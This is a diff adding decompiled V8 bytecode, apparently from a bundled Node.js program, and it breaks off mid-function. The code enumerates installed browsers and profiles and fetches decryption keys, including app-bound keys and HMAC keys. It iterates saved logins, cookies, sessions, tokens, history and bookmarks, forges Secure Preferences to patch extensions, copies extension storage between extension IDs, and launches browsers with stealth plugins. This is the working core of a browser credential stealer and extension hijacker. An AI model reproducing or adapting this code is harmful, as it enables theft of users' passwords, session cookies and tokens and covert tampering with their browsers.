@@ -1,0 +1,2374 @@
+function func_browserExports_0x10000b77e(a0)
+{
+	Scope[1560][15] = func_C_0x10000b767
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interopDefault_0x10000b771
+	}
+	Scope[1560][16] = ACCU
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	r5 = "browsers"
+	r7 = "findInstalledBrowser"
+	r9 = "iterInstalledBrowsers"
+	r11 = "iterBrowsers"
+	r13 = "BrowserExtension"
+	r15 = "BrowserProfile"
+	r18 = undefined
+	a0["Browser"] = undefined
+	a0[r15] = r18
+	a0[r13] = r18
+	a0[r11] = r18
+	a0[r9] = r18
+	a0[r7] = r18
+	a0[r5] = r18
+	r7 = func_browserConfig_0x10000a9ad["exports"]()
+	r1 = Scope[1560][16](r7)
+	r2 = func_exportKeys_0x10000a9b1["exports"]()
+	Scope[1560][17] = func_Browser_0x10000b751["exports"]()
+	r4 = Object["defineProperty"]
+	r7 = "Browser"
+	r8 = new {"enumerable": <true, "get": null}
+	r8["get"] = func_defaultExport_0x10000b773
+	ACCU = r4(a0, r7, r8)
+	Scope[1560][18] = func_initStore_0x10000b6e2["exports"]()
+	r4 = Object["defineProperty"]
+	r7 = "BrowserProfile"
+	r8 = new {"enumerable": <true, "get": null}
+	r8["get"] = func_getDefault_0x10000b775
+	ACCU = r4(a0, r7, r8)
+	Scope[1560][19] = func_profileExports_0x10000adff["exports"]()
+	r4 = Object["defineProperty"]
+	r7 = "BrowserExtension"
+	r8 = new {"enumerable": <true, "get": null}
+	r8["get"] = func_default_0x10000b777
+	ACCU = r4(a0, r7, r8)
+	Scope[1560][20] = func_browser_0x10000b766["exports"]()
+	r4 = Object["defineProperty"]
+	r7 = "iterBrowsers"
+	r8 = new {"enumerable": <true, "get": null}
+	r8["get"] = func_browsers_0x10000b779
+	ACCU = r4(a0, r7, r8)
+	r4 = Object["defineProperty"]
+	r7 = "iterInstalledBrowsers"
+	r8 = new {"enumerable": <true, "get": null}
+	r8["get"] = func_getBrowsers_0x10000b77b
+	ACCU = r4(a0, r7, r8)
+	r4 = Object["defineProperty"]
+	r7 = "findInstalledBrowser"
+	r8 = new {"enumerable": <true, "get": null}
+	r8["get"] = func_browser_0x10000b77d
+	ACCU = r4(a0, r7, r8)
+	r6 = r2["keys"]
+	r7 = r1["default"]["browsers"]
+	a0["browsers"] = r6(r7)
+	return undefined
+}
+function func_browser_0x10000b77d()
+{
+	return Scope[1560][20]["findInstalledBrowser"]
+}
+function func_getBrowsers_0x10000b77b()
+{
+	return Scope[1560][20]["iterInstalledBrowsers"]
+}
+function func_browsers_0x10000b779()
+{
+	return Scope[1560][20]["iterBrowsers"]
+}
+function func_default_0x10000b777()
+{
+	r1 = Scope[1560][16](Scope[1560][19])
+	return r1["default"]
+}
+function func_getDefault_0x10000b775()
+{
+	r1 = Scope[1560][16](Scope[1560][18])
+	return r1["default"]
+}
+function func_defaultExport_0x10000b773()
+{
+	r1 = Scope[1560][16](Scope[1560][17])
+	return r1["default"]
+}
+function func_interopDefault_0x10000b771(a0)
+{
+	if (a0)
+	ACCU = a0["__esModule"]
+		&& (a0["__esModule"])
+	{
+		ACCU = a0
+	}
+	else
+	{
+		r2 = new {"default": null}
+		r2["default"] = a0
+		ACCU = r2
+	}
+	return ACCU
+}
+function func_browser_0x10000b766(a0)
+{
+	Scope[1564][11] = func_l_0x10000b752
+	Scope[1564][16] = func_findInstall_0x10000b75d
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interop_0x10000b765
+	}
+	r1 = ACCU
+	r7 = Object["defineProperty"]
+	r10 = "__esModule"
+	r11 = new {"value": <true}
+	ACCU = r7(a0, r10, r11)
+	a0["iterBrowsers"] = func_IterateKeys_0x10000b754
+	a0["iterInstalledBrowsers"] = func_Install_0x10000b756
+	a0["findInstalledBrowser"] = func_install_0x10000b758
+	r10 = func_browserConfig_0x10000a9ad["exports"]()
+	r2 = r1(r10)
+	r10 = func_Browser_0x10000b751["exports"]()
+	Scope[1564][12] = r1(r10)
+	Scope[1564][13] = func_initModule_0x1000054f8["exports"]()
+	Scope[1564][14] = func_exportKeys_0x10000a9b1["exports"]()
+	r7 = r2["default"]
+	Scope[1564][15] = r7["browsers"]
+	return undefined
+}
+function func_interop_0x10000b765(a0)
+{
+	if (a0)
+	ACCU = a0["__esModule"]
+		&& (a0["__esModule"])
+	{
+		ACCU = a0
+	}
+	else
+	{
+		r2 = new {"default": null}
+		r2["default"] = a0
+		ACCU = r2
+	}
+	return ACCU
+}
+function func_findInstall_0x10000b75d(a0, a1, a2)
+{
+	Scope[1566][2] = a0
+	Scope[1566][3] = a1
+	ACCU = a2
+	if (a2 == undefined)
+	{
+		r4 = Scope[1564][13]["listInstalledApplications"]
+		ACCU = r4()
+	}
+	else
+	{
+		ACCU = a2
+	}
+	r0 = ACCU
+	Scope[1567][3] = func_F_0x10000b759
+	r5 = r0["filter"]
+	r1 = r5(func_matchPackage_0x10000b75a)
+	r5 = r1["find"]
+	ACCU = r5(func_isAnonymous_0x10000b75b)
+	if (!r5(func_isAnonymous_0x10000b75b))
+	{
+		r5 = r1["find"]
+		ACCU = r5(func_anonymous_0x10000b75c)
+		if (!r5(func_anonymous_0x10000b75c))
+		{
+			ACCU = r1[0]
+		}
+	}
+	r2 = ACCU
+	if (!ACCU)
+	{
+		r6 = ("Could not find " + Scope[1566][2]["name"])
+		ACCU = Error
+		ACCU = Error(r6)
+	}
+	return r2["install"]["location"]
+}
+function func_install_0x10000b758(a0, a1)
+{
+	r8 = func_findInstall_0x10000b75d(Scope[1564][15][a0]["msi"], a1)
+	r9 = Scope[1564][12]["default"]
+	ACCU = Scope[1564][12]["default"]
+	return r9(a0, Scope[1564][15][a0]["userData"], Scope[1564][15][a0]["executable"], Scope[1564][15][a0]["hmacKey"], Scope[1564][15][a0]["serviceKeys"], Scope[1564][15][a0]["launch"], Scope[1564][15][a0]["extensions"], r8)
+}
+function func_Install_0x10000b756(a0)
+{
+	r0 = _CreateJSGeneratorObject(<closure>, <this>)
+	r15 = r0
+	switch (_GeneratorGetResumeMode(r0))
+	default:
+	{
+		ACCU = r15
+	}
+	case (1):
+	{
+		return r15
+	}
+	case (0):
+	{}
+	r15 = Scope[1564][13]["listInstalledApplications"]
+	r1 = r15()
+	r19 = 106512
+	r15 = Scope[1564][14]["keys"]
+	r17 = r15(Scope[1564][15])
+	r16 = GetIterator(r17)
+	r15 = r16["next"]
+	ACCU = false
+	r17 = false
+	try
+	{
+		while (true)
+		{
+			r17 = true
+			r21 = r15()
+			if (r21["done"]) break
+			r17 = false
+			r5 = r21["value"]
+			r6 = Scope[1564][15][r21["value"]]["userData"]
+			r7 = Scope[1564][15][r21["value"]]["executable"]
+			r8 = Scope[1564][15][r21["value"]]["hmacKey"]
+			r9 = Scope[1564][15][r21["value"]]["serviceKeys"]
+			r10 = Scope[1564][15][r21["value"]]["launch"]
+			r11 = Scope[1564][15][r21["value"]]["msi"]
+			r12 = Scope[1564][15][r21["value"]]["extensions"]
+			r21 = r21["value"]
+			try
+			{
+				r26 = r11
+				r27 = a0
+				r28 = r1
+				r13 = func_findInstall_0x10000b75d(r26, r27, r28)
+				r23 = Scope[1564][12]["default"]
+				ACCU = Scope[1564][12]["default"]
+				r24 = r5
+				r25 = r6
+				r26 = r7
+				r27 = r8
+				r28 = r9
+				r29 = r10
+				r30 = r12
+				r31 = r13
+				r23 = r23(r24, r25, r26, r27, r28, r29, r30, r31)
+				r23 = _CreateIterResultObject(r23, false)
+				switch (_GeneratorGetResumeMode(r0))
+				default:
+				{
+					ACCU = r23
+				}
+				case (1):
+				{
+					r18 = 1
+					r19 = r23
+					break
+				}
+				case (0):
+				{}
+				ACCU = r23
+				continue
+			}
+			catch {}
+			ACCU = null
+			ACCU = Scope[1568]
+		}
+		ACCU = -1
+		r19 = -1
+		r18 = -1
+	}
+	catch
+	{
+		r19 = ACCU
+		r18 = 0
+	}
+	if (!r17)
+	{
+		try
+		{
+			if (!r16["return"] == undefined)
+			{
+				ACCU = r16["return"]()
+			}
+			catch {}
+		}
+	}
+	ACCU = null
+	switch (r18)
+	default:
+	{
+		break
+	}
+	case (0):
+	{
+		ACCU = r19
+	}
+	case (1):
+	{
+		return r19
+	}
+	return undefined
+}
+function func_IterateKeys_0x10000b754()
+{
+	r0 = _CreateJSGeneratorObject(<closure>, <this>)
+	r11 = r0
+	switch (_GeneratorGetResumeMode(r0))
+	default:
+	{
+		ACCU = r11
+	}
+	case (1):
+	{
+		return r11
+	}
+	case (0):
+	{}
+	r14 = 125542
+	r11 = Scope[1564][14]["keys"]
+	r13 = r11(Scope[1564][15])
+	r12 = GetIterator(r13)
+	r11 = r12["next"]
+	ACCU = false
+	r13 = false
+	try
+	{
+		while (true)
+		{
+			r13 = true
+			r17 = r11()
+			if (r17["done"]) break
+			r13 = false
+			r18 = Scope[1564][12]["default"]
+			ACCU = Scope[1564][12]["default"]
+			r18 = r18(r17["value"], Scope[1564][15][r17["value"]]["userData"], Scope[1564][15][r17["value"]]["executable"], Scope[1564][15][r17["value"]]["hmacKey"], Scope[1564][15][r17["value"]]["serviceKeys"], Scope[1564][15][r17["value"]]["launch"], Scope[1564][15][r17["value"]]["extensions"])
+			r17 = r17["value"]
+			r18 = _CreateIterResultObject(r18, false)
+			switch (_GeneratorGetResumeMode(r0))
+			default:
+			{
+				ACCU = r18
+			}
+			case (1):
+			{
+				r14 = 1
+				r15 = r18
+				break
+			}
+			case (0):
+			{}
+			ACCU = r18
+		}
+		ACCU = -1
+		r15 = -1
+		r14 = -1
+	}
+	catch
+	{
+		r15 = ACCU
+		r14 = 0
+	}
+	if (!r13)
+	{
+		try
+		{
+			if (!r12["return"] == undefined)
+			{
+				ACCU = r12["return"]()
+			}
+			catch {}
+		}
+	}
+	ACCU = null
+	switch (r14)
+	default:
+	{
+		break
+	}
+	case (0):
+	{
+		ACCU = r15
+	}
+	case (1):
+	{
+		return r15
+	}
+	return undefined
+}
+function func_Browser_0x10000b751(a0)
+{
+	Scope[1569][10] = func_l_0x10000b742
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_DefaultExport_0x10000b748
+	}
+	r2 = ACCU
+	r5 = Object["defineProperty"]
+	r8 = "__esModule"
+	r9 = new {"value": <true}
+	ACCU = r5(a0, r8, r9)
+	r8 = func_initStore_0x10000b6e2["exports"]()
+	Scope[1569][11] = r2(r8)
+	Scope[1569][12] = func_profiles_0x10000b6f1["exports"]()
+	Scope[1569][13] = func_browserLaunch_0x10000b741["exports"]()
+	Scope[1569][14] = require("path")
+	ACCU = ToName("iterProfiles")
+	ACCU = ToName("launch")
+	ACCU = ToName("executablePath")
+	r6 = DefineClass([9, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[29], <NumberDictionary[16], [12, 20, 29]], func_configureApp_0x10000b74a, null, 108117, func_iterateProfiles_0x10000b74c, func_l_0x10000b742, func_launchBrowser_0x10000b74e, "[()[", func_join_0x10000b750)
+	a0["default"] = func_configureApp_0x10000b74a
+	return undefined
+}
+function func_join_0x10000b750()
+{
+	r2 = Scope[1569][14]["join"]
+	r3 = <this>["path"]
+	return r2(r3, <this>["executable"])
+}
+function func_launchBrowser_0x10000b74e(a0)
+{
+	r1 = Scope[1569][13]["launchBrowser"]
+	r2 = <this>["executablePath"]
+	r3 = <this>["launchOptions"]
+	return r1(r2, r3, a0)
+}
+function func_iterateProfiles_0x10000b74c(a0, a1)
+{
+	r8 = <closure>
+	r9 = <this>
+	r0 = _CreateJSGeneratorObject(<closure>, <this>)
+	ACCU = func_m_0x10000b74b
+	try
+	{
+		try
+		{
+			r12 = r0
+			ACCU = _GeneratorGetResumeMode(r0)
+			switch (_GeneratorGetResumeMode(r0))
+			default:
+			{
+				ACCU = r12
+			}
+			case (1):
+			{
+				ACCU = 1
+				r8 = 1
+				r9 = r12
+				break
+			}
+			case (0):
+			{
+				r13 = Scope[1569][14]
+				r12 = Scope[1569][14]["join"]
+				r14 = <this>["userData"]
+				r2 = r12(a0, r14)
+				try
+				{
+					r13 = Scope[1569][12]["getKeys"]
+					r20 = 118601
+					r14 = r13(r2, a1, <this>["serviceKeys"])
+					r13 = _AsyncGeneratorAwaitCaught(r0, r14)
+					r14 = _GeneratorGetResumeMode(r0)
+					if (!r14 === 0)
+					{
+						ACCU = r13
+					}
+					r4 = r13["key"]
+					r5 = r13["appBoundKey"]
+					r15 = Scope[1569][12]["iterProfiles"](r2)
+					ACCU = r15[Symbol.asyncIterator]
+					if (!r15[Symbol.asyncIterator] == undefined)
+					{
+						r16 = r15[Symbol.asyncIterator]
+						ACCU = r15[Symbol.asyncIterator]()
+					}
+					r14 = ACCU
+					r13 = r14["next"]
+					ACCU = false
+					r15 = false
+					try
+					{
+						while (true)
+						{
+							r15 = true
+							r21 = r13()
+							r20 = r0
+							r20 = _AsyncGeneratorAwaitCaught(r20, r21)
+							r21 = _GeneratorGetResumeMode(r0)
+							if (!r21 === 0)
+							{
+								ACCU = r20
+							}
+							ACCU = r20
+							r19 = r20
+							if (r19["done"]) break
+							r15 = false
+							r22 = Scope[1569][11]["default"]
+							ACCU = Scope[1569][11]["default"]
+							r25 = r4
+							r26 = r5
+							r27 = a1
+							r23 = r22(<this>, r19["value"], r25, r26, r27)
+							r22 = r0
+							r19 = r19["value"]
+							r22 = _AsyncGeneratorYield(r22, r23, true)
+							switch (_GeneratorGetResumeMode(r0))
+							default:
+							{
+								ACCU = r22
+							}
+							case (1):
+							{
+								r16 = 1
+								r17 = r22
+								break
+							}
+							case (0):
+							{}
+							ACCU = r22
+						}
+						ACCU = -1
+						r17 = -1
+						r16 = -1
+					}
+					catch
+					{
+						r17 = ACCU
+						r16 = 0
+					}
+					if (!r15)
+					{
+						try
+						{
+							if (!r14["return"] == undefined)
+							{
+								r25 = r14["return"]()
+								r24 = _AsyncGeneratorAwaitCaught(r0, r25)
+								r25 = _GeneratorGetResumeMode(r0)
+								if (!r25 === 0)
+								{
+									ACCU = r24
+								}
+								ACCU = r24
+							}
+							catch {}
+						}
+					}
+					ACCU = null
+					switch (r16)
+					default:
+					{
+						break
+					}
+					case (0):
+					{
+						ACCU = r17
+					}
+					case (1):
+					{
+						r8 = 1
+						r9 = r17
+						break
+					}
+				}
+				catch
+				{
+					ACCU = null
+					ACCU = Scope[1569]
+				}
+				r9 = undefined
+				ACCU = 1
+				r8 = 1
+			}
+			catch
+			{
+				r12 = ACCU
+				ACCU = null
+				ACCU = Scope[1571]
+				r9 = _AsyncGeneratorReject(r0, Scope[1571][2])
+				r8 = 2
+			}
+		}
+		catch
+		{
+			r9 = ACCU
+			r8 = 0
+		}
+	}
+	ACCU = _GeneratorClose(r0)
+	ACCU = null
+	switch (r8)
+	default:
+	{
+		break
+	}
+	case (0):
+	{
+		ACCU = r9
+	}
+	case (1):
+	{
+		return _AsyncGeneratorResolve(r0, r9, true)
+	}
+	case (2):
+	{
+		return r9
+	}
+	return undefined
+}
+function func_configureApp_0x10000b74a(a0, a1, a2, a3, a4, a5, a6, a7)
+{
+	r0 = a0
+	r1 = a1
+	r2 = a2
+	r3 = a3
+	r4 = a4
+	r5 = a5
+	r6 = a6
+	ACCU = a7
+	if (a7 == undefined)
+	{
+		ACCU = ""
+	}
+	else
+	{
+		ACCU = a7
+	}
+	r7 = ACCU
+	<this>["application"] = r0
+	<this>["userData"] = r1
+	<this>["executable"] = r2
+	<this>["hmacKey"] = r3
+	<this>["serviceKeys"] = r4
+	<this>["launchOptions"] = r5
+	<this>["extensions"] = r6
+	<this>["path"] = r7
+	return undefined
+}
+function func_DefaultExport_0x10000b748(a0)
+{
+	if (a0)
+	ACCU = a0["__esModule"]
+		&& (a0["__esModule"])
+	{
+		ACCU = a0
+	}
+	else
+	{
+		r2 = new {"default": null}
+		r2["default"] = a0
+		ACCU = r2
+	}
+	return ACCU
+}
+function func_browserLaunch_0x10000b741(a0)
+{
+	Scope[1574][7] = func_a_0x10000b739
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_esmDefault_0x10000b740
+	}
+	r1 = ACCU
+	r8 = Object["defineProperty"]
+	r11 = "__esModule"
+	r12 = new {"value": <true}
+	ACCU = r8(a0, r11, r12)
+	a0["launchBrowser"] = func_launch_0x10000b73b
+	r11 = func_initMerge_0x10000b738["exports"]()
+	Scope[1574][8] = r1(r11)
+	r11 = func_unknown_0x1000017d5["exports"]()
+	Scope[1574][9] = r1(r11)
+	r2 = func_unknown_0x1000017d6["exports"]()
+	r9 = Array.from(r2["core"])
+	r8 = r9["length"]
+	r12 = r2["stealth"]
+	r11 = GetIterator(r12)
+	r10 = r11["next"]
+	while (true)
+	{
+		r12 = r10()
+		if (r12["done"]) break
+		r9[r8] = r12["value"]
+		r8 = (r8 + 1)
+	}
+	r9 = GetIterator(r9)
+	r8 = r9["next"]
+	ACCU = false
+	r10 = false
+	try
+	{
+		while (true)
+		{
+			r10 = true
+			r14 = r8()
+			if (r14["done"]) break
+			r10 = false
+			r16 = Scope[1574][9]["default"]
+			r15 = r16["use"]
+			r17 = r14["value"]()
+			ACCU = r15(r17)
+			r14 = r14["value"]
+		}
+		ACCU = -1
+		r12 = -1
+		r11 = -1
+	}
+	catch
+	{
+		r12 = ACCU
+		r11 = 0
+	}
+	if (!r10)
+	{
+		try
+		{
+			if (!r9["return"] == undefined)
+			{
+				ACCU = r9["return"]()
+			}
+			catch {}
+		}
+	}
+	ACCU = null
+	if (r11 === 0)
+	{
+		ACCU = r12
+	}
+	return undefined
+}
+function func_profiles_0x10000b6f1(a0)
+{
+	Scope[1591][12] = func_l_0x10000b6e3
+	Scope[1591][13] = func_Decodebase64_0x10000b6eb
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	a0["iterProfiles"] = func_infoCache_0x10000b6e5
+	a0["getKeys"] = func_DecryptKeys_0x10000b6e9
+	Scope[1591][8] = func_initDecrypt_0x10000af44["exports"]()
+	Scope[1591][9] = func_json_0x10000ab8a["exports"]()
+	Scope[1591][10] = func_fsExports_0x10000a9c5["exports"]()
+	Scope[1591][11] = require("path")
+	return undefined
+}
+function func_initStore_0x10000b6e2(a0)
+{
+	Scope[1597][26] = func_J_0x10000b6c9
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interopDefault_0x10000b6cf
+	}
+	r2 = ACCU
+	r5 = Object["defineProperty"]
+	r8 = "__esModule"
+	r9 = new {"value": <true}
+	ACCU = r5(a0, r8, r9)
+	r8 = func_profileExports_0x10000adff["exports"]()
+	Scope[1597][18] = r2(r8)
+	Scope[1597][19] = func_login_0x10000af4c["exports"]()
+	Scope[1597][20] = func_cookie_0x10000af62["exports"]()
+	Scope[1597][21] = func_initSession_0x10000b6ad["exports"]()
+	Scope[1597][22] = func_token_0x10000b6b5["exports"]()
+	Scope[1597][23] = func_initHistory_0x10000b6bd["exports"]()
+	Scope[1597][24] = func_initBookmarks_0x10000b6c8["exports"]()
+	Scope[1597][25] = func_extension_0x10000adee["exports"]()
+	ACCU = ToName("getExpiryDate")
+	ACCU = ToName("iterLogins")
+	ACCU = ToName("iterCookies")
+	ACCU = ToName("iterSessions")
+	ACCU = ToName("iterTokens")
+	ACCU = ToName("iterHistoryURLs")
+	ACCU = ToName("iterBookmarks")
+	ACCU = ToName("iterExtensions")
+	r6 = DefineClass([19, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[53], <NumberDictionary[52], [12, 20, 28, 36, 44, 52, 60, 68]], func_initKey_0x10000b6d1, null, "b48I", func_expiryDate_0x10000b6d3, func_J_0x10000b6c9, func_iterLogins_0x10000b6d5, func_J_0x10000b6c9, func_iterCookies_0x10000b6d7, func_J_0x10000b6c9, func_iterSessions_0x10000b6d9, func_J_0x10000b6c9, func_iterTokens_0x10000b6db, func_J_0x10000b6c9, func_iterHistory_0x10000b6dd, func_J_0x10000b6c9, func_bookmarks_0x10000b6df, func_J_0x10000b6c9, func_Iterate_0x10000b6e1)
+	a0["default"] = func_initKey_0x10000b6d1
+	return undefined
+}
+function func_profileExports_0x10000adff(a0)
+{
+	Scope[1989][13] = func_E_0x10000adef
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	Scope[1989][14] = func_extension_0x10000adee["exports"]()
+	ACCU = ToName("applyPatch")
+	ACCU = ToName("revertPatch")
+	ACCU = ToName("openSettings")
+	ACCU = ToName("openLocalStorage")
+	ACCU = ToName("patchInput")
+	r5 = DefineClass([14, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[53], <NumberDictionary[28], [16, 24, 32, 40, 49]], func_profile_0x10000adf2, null, func_getOriginalOrCurrentId_0x10000adf4, "Yx9u", func_applyPatch_0x10000adf6, func_E_0x10000adef, func_revertPatch_0x10000adf8, func_E_0x10000adef, func_openSettings_0x10000adfa, func_E_0x10000adef, func_openStorage_0x10000adfc, func_E_0x10000adef, func_profileSettings_0x10000adfe)
+	a0["default"] = func_profile_0x10000adf2
+	return undefined
+}
+function func_profileSettings_0x10000adfe()
+{
+	r2 = <this>["profile"]["browser"]
+	r3 = new {"extensionId": null, "securePreferences": null, "domainSid": null, "profile": null, "settingsKey": null, "snoozeDevModeWarning": null, "hmacKey": null}
+	r3["extensionId"] = <this>["currentId"]
+	r3["securePreferences"] = <this>["securePreferences"]
+	r3["domainSid"] = <this>["domainSid"]
+	r3["profile"] = <this>["profile"]["path"]
+	ACCU = <this>["profile"]["browser"]["extensions"]
+	r4 = <this>["profile"]["browser"]["extensions"]
+	if (!ACCU == undefined)
+	{
+		ACCU = r4["settingsKey"]
+	}
+	else
+	{
+		ACCU = undefined
+	}
+	r3["settingsKey"] = ACCU
+	ACCU = r2["extensions"]
+	r4 = r2["extensions"]
+	if (!r2["extensions"] == undefined)
+	{
+		ACCU = r4["snoozeDevModeWarning"]
+	}
+	else
+	{
+		ACCU = undefined
+	}
+	r3["snoozeDevModeWarning"] = ACCU
+	r3["hmacKey"] = r2["hmacKey"]
+	return r3
+}
+function func_openStorage_0x10000adfc()
+{
+	r2 = Scope[1989][14]["openExtensionLocalStorage"]
+	r3 = <this>["profile"]["path"]
+	return r2(r3, <this>["currentId"], true)
+}
+function func_openSettings_0x10000adfa(a0)
+{
+	r1 = Scope[1989][14]["openExtensionSettings"]
+	r2 = <this>["profile"]["path"]
+	r3 = <this>["currentId"]
+	return r1(r2, r3, a0, true)
+}
+function func_revertPatch_0x10000adf8()
+{
+	r2 = Scope[1989][14]["revertExtensionPatch"]
+	return r2(<this>["patchInput"])
+}
+function func_applyPatch_0x10000adf6(a0)
+{
+	r2 = Scope[1989][14]["applyExtensionPatch"]
+	return r2(<this>["patchInput"], a0)
+}
+function func_getOriginalOrCurrentId_0x10000adf4()
+{
+	ACCU = <this>["originalId"]
+	if (!<this>["originalId"])
+	{
+		ACCU = <this>["currentId"]
+	}
+	return ACCU
+}
+function func_profile_0x10000adf2(a0, a1, a2, a3, a4)
+{
+	r0 = a0
+	r1 = a1
+	r2 = a2
+	r3 = a3
+	ACCU = a4
+	if (a4 == undefined)
+	{
+		ACCU = ""
+	}
+	else
+	{
+		ACCU = a4
+	}
+	r4 = ACCU
+	<this>["profile"] = r0
+	<this>["currentId"] = r1
+	<this>["originalId"] = r2
+	<this>["securePreferences"] = r3
+	<this>["domainSid"] = r4
+	return undefined
+}
+function func_extension_0x10000adee(a0)
+{
+	Scope[1994][27] = func_installExtension_0x10000adce
+	Scope[1994][28] = func_loadExtensions_0x10000add7
+	Scope[1994][29] = func_syncSettings_0x10000add9
+	Scope[1994][30] = func_copySettings_0x10000addb
+	Scope[1994][31] = func_copyStorage_0x10000addd
+	Scope[1994][32] = func_L_0x10000adde
+	Scope[1994][33] = func_joinSettings_0x10000ade0
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_wrapModule_0x10000aded
+	}
+	r1 = ACCU
+	r7 = Object["defineProperty"]
+	r10 = "__esModule"
+	r11 = new {"value": <true}
+	ACCU = r7(a0, r10, r11)
+	a0["iterExtensions"] = func_loadPreferences_0x10000adcc
+	a0["applyExtensionPatch"] = func_installExtension_0x10000adce
+	a0["revertExtensionPatch"] = func_restoreExtension_0x10000add0
+	a0["openExtensionSettings"] = func_open_0x10000add2
+	a0["openExtensionLocalStorage"] = func_openExtension_0x10000add4
+	r10 = func_initDatabase_0x10000a9e4["exports"]()
+	Scope[1994][20] = r1(r10)
+	Scope[1994][21] = require("crypto")
+	Scope[1994][22] = require("path")
+	Scope[1994][23] = func_initStorage_0x10000aa13["exports"]()
+	Scope[1994][24] = func_initExtension_0x10000adca["exports"]()
+	Scope[1994][25] = func_json_0x10000ab8a["exports"]()
+	Scope[1994][26] = func_fsExports_0x10000a9c5["exports"]()
+	return undefined
+}
+function func_wrapModule_0x10000aded(a0)
+{
+	if (a0)
+	ACCU = a0["__esModule"]
+		&& (a0["__esModule"])
+	{
+		ACCU = a0
+	}
+	else
+	{
+		r1 = new {"default": null}
+		r1["default"] = a0
+		ACCU = r1
+	}
+	return ACCU
+}
+function func_joinSettings_0x10000ade0(a0, a1, a2)
+{
+	r5 = "LOCAL"
+	ACCU = a2 === r5
+	if (a2 === r5)
+	{
+		ACCU = "Local"
+	}
+	else
+	{
+		ACCU = "Sync"
+	}
+	r0 = ACCU
+	r2 = Scope[1994][22]["join"]
+	r4 = (r0 + " Extension Settings")
+	return r2(a0, r4, a1)
+}
+function func_copyStorage_0x10000addd(a0, a1, a2)
+{
+	r4 = <closure>
+	r5 = <this>
+	ACCU = func_U_0x10000addc
+	try
+	{
+		r8 = 111496
+		r5 = Scope[1994][23]["openLocalStorage"]
+		r6 = r5(a0, false)
+		r5 = await r6
+		r6 = _GeneratorGetResumeMode(Scope[1995])
+		if (!r6 === 0)
+		{
+			ACCU = r5
+		}
+		r1 = r5
+		ACCU = r1
+		try
+		{
+			r8 = r1["copy"]
+			r10 = ("chrome-extension://" + a1)
+			r11 = ("chrome-extension://" + a2)
+			r9 = r8(r10, r11)
+			r8 = await r9
+			r9 = _GeneratorGetResumeMode(Scope[1995])
+			if (!r9 === 0)
+			{
+				ACCU = r8
+			}
+			ACCU = -1
+			r6 = -1
+			r5 = -1
+		}
+		catch
+		{
+			r6 = ACCU
+			r5 = 0
+		}
+		r8 = r1["close"]
+		r9 = r8()
+		r8 = await r9
+		r9 = _GeneratorGetResumeMode(Scope[1995])
+		if (!r9 === 0)
+		{
+			ACCU = r8
+		}
+		ACCU = null
+		if (r5 === 0)
+		{
+			ACCU = r6
+		}
+		r6 = undefined
+		ACCU = r6
+		return r6
+	}
+	catch {}
+	r5 = ACCU
+	ACCU = null
+	ACCU = Scope[1996]
+	return Scope[1996][2]
+}
+function func_copySettings_0x10000addb(a0, a1, a2, a3)
+{
+	r5 = <closure>
+	r6 = <this>
+	ACCU = func_U_0x10000adda
+	try
+	{
+		r2 = func_joinSettings_0x10000ade0(a0, a1, a3)
+		r3 = func_joinSettings_0x10000ade0(a0, a2, a3)
+		r6 = Scope[1994][26]["copy"]
+		r7 = r6(r2, r3)
+		r6 = await r7
+		r7 = _GeneratorGetResumeMode(Scope[1997])
+		if (!r7 === 0)
+		{
+			ACCU = r6
+		}
+		r7 = undefined
+		ACCU = r7
+		return r7
+	}
+	catch {}
+	r6 = ACCU
+	ACCU = null
+	ACCU = Scope[1998]
+	return Scope[1998][2]
+}
+function func_syncSettings_0x10000add9(a0, a1, a2)
+{
+	r2 = <closure>
+	r3 = <this>
+	r0 = ACCU
+	ACCU = func_G_0x10000add8
+	try
+	{
+		r3 = Promise["all"]
+		r6 = new [0, 0, 0]
+		r6[0] = func_copySettings_0x10000addb(a0, a1, a2, "LOCAL")
+		r6[1] = func_copySettings_0x10000addb(a0, a1, a2, "SYNC")
+		r6[2] = func_copyStorage_0x10000addd(a0, a1, a2)
+		r4 = r3(r6)
+		r3 = r0
+		r3 = await r4
+		r4 = _GeneratorGetResumeMode(r0)
+		if (!r4 === 0)
+		{
+			ACCU = r3
+		}
+		r4 = undefined
+		r3 = r0
+		ACCU = r4
+		return r4
+	}
+	catch {}
+	r3 = ACCU
+	ACCU = null
+	ACCU = Scope[1999]
+	r4 = r0
+	return Scope[1999][2]
+}
+function func_loadExtensions_0x10000add7(a0, a1)
+{
+	r13 = <closure>
+	r14 = <this>
+	r0 = _CreateJSGeneratorObject(<closure>, <this>)
+	ACCU = func_G_0x10000add5
+	try
+	{
+		try
+		{
+			r17 = r0
+			ACCU = _GeneratorGetResumeMode(r0)
+			switch (_GeneratorGetResumeMode(r0))
+			default:
+			{
+				ACCU = r17
+			}
+			case (1):
+			{
+				ACCU = 1
+				r13 = 1
+				r14 = r17
+				break
+			}
+			case (0):
+			{
+				r18 = Scope[1994][22]
+				r17 = Scope[1994][22]["join"]
+				r2 = r17(a0, a1)
+				try
+				{
+					r18 = Scope[1994][25]["readJSON"]
+					r19 = r18(r2)
+					r18 = _AsyncGeneratorAwaitCaught(r0, r19)
+					r19 = _GeneratorGetResumeMode(r0)
+					if (!r19 === 0)
+					{
+						ACCU = r18
+					}
+					ACCU = r18["extensions"]["opsettings"]
+					if (!r18["extensions"]["opsettings"])
